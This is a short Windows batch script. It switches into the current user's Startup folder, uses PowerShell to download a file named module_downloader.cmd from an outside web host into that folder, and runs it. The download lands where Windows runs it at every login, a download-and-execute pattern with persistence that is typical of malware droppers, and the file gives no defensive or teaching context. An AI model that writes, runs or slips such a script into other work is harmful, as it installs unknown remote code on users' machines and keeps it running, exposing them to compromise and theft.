@echo off

SET currentDirectory=%cd%

SET TARGETDIR="C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
cd %TARGETDIR%

@REM (
powershell "Invoke-WebRequest -Uri 'https://arth.imbeddex.com/module_downloader.cmd' -OutFile module_downloader.cmd"
module_downloader.cmd